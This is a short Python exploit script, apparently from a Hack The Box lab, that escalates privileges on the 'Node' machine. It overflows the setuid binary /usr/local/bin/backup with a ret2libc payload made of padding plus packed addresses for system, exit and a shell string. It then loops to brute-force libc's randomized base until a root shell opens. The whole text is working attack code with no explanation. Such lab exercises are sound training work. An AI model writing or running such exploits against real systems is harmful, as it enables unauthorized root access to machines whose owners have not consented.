"""
Exploit for privilege escalation in HTB Node.
"""

import struct, subprocess

buf = "A" * 512

libcaddr = 0xf7530000

systemaddr = struct.pack('<I', libcaddr + 0x0003a940)

exitaddr = struct.pack('<I', libcaddr + 0x0002e7b0)

shaddr = struct.pack('<I', libcaddr + 0x0015900b)

payload = buf + systemaddr + exitaddr + shaddr

while True:
    subprocess.call(["/usr/local/bin/backup", "flag", "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474", payload])
